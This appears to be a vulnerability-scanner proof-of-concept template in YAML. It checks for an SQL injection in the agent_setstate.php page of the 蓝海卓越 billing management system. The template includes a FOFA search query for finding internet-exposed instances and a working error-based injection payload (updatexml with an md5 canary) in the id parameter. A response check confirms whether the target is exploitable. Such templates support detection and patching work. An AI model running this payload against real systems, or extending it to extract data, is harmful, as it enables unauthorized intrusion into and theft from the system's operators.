id: poc-yaml-lhzy-system-agent-setstate-sqli
info:
  name: 蓝海卓越计费管理系统 agent_setstate.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 蓝海卓越计费管理系统
  fofa: title=="蓝海卓越计费管理系统"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /agent_setstate.php?id=(updatexml(1,concat(0x7e,(select%20md5({{.t1}})),0x7e),1))
  expression: "status_code == 200 && \ncontains(body,substr(t2,0,31))\n"
transport: http
